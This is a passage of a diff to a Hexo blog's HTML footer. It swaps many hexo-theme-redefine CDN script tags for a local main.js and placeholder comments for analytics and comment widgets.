+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
-	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>
+<!-- Disqus Comments -->
 
+<!-- utterances Comments -->
 
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>
-
-
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>
-
-
-
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
-    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">
-
-
-
-  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
-  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>
-
-
-
-    
-        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script>
-    
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/mermaid.js" ></script>
-
-
-
-
-
-    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>
-
-
-
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>
-
-
-<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
-<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>
-
-
-
-
-    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/bookmarkNav.js" ></script>
-
-	
 </body>
-
 </html>
